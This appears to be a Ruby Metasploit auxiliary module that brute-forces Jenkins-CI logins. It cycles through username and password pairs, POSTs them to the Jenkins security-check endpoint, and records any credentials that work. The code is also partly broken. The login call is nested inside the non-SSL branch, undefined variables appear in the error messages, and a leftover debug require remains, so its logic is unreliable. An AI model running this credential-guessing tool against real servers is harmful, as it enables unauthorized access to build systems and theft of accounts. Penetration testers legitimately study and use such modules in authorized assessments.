##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'pry'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'Jenkins-CI Login Utility',
      'Description'    => 'This module simply attempts to login to a Jenkins-CI instance using a specific user/pass.',
      'Author'         => [ 'NS', 'Nicholas Starke <starke.nicholas[at]gmail.com>', 'nstarke' ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(8080),
        OptAddress.new('RHOST', [ true, "The target address", true])
      ], self.class)

    register_autofilter_ports([ 80, 443, 8080, 8081, 8000 ])
    deregister_options('RHOSTS')
  end

  def run
    each_user_pass do |user, pass|
      next if (user.blank? or pass.blank?)
      vprint_status("Trying #{user} : #{pass}")
      if (datastore['SSL'].to_s.match(/^(t|y|1)/i))
        protocol = 'https://'
      else
        protocol = 'http://'
      do_login(user, pass)
      end
    end
  end

  def do_login(user, pass)
    begin
      post_data = {
        'j_username' => user,
        'j_password' => pass
      }
      res = send_request_cgi({
        'uri' => '/j_acegi_security_check',
        'method' => 'POST',
        'vars_post' => post_data
      })
    rescue ::Rex::ConnectionError => e
      vprint_error("#{rhost}:#{rport}#{url} - #{e}")
      return
    end
    if not res
      vprint_error("#{rhost}:#{rport}#{url} - #{e}")
      return
    end
    if !res.headers['location'].include? 'loginError'
      print_good("SUCCESSFUL LOGIN. '#{user} : #{pass}'")
      report_hash = {
        :host => datastore['RHOST'],
        :port => datastore['RPORT'],
        :sname => 'jenkins',
        :user => user,
        :pass => pass,
        :active => true,
        :type => 'password'
      }
      report_auth_info(report_hash)
      return :next_user
    end
  end
end
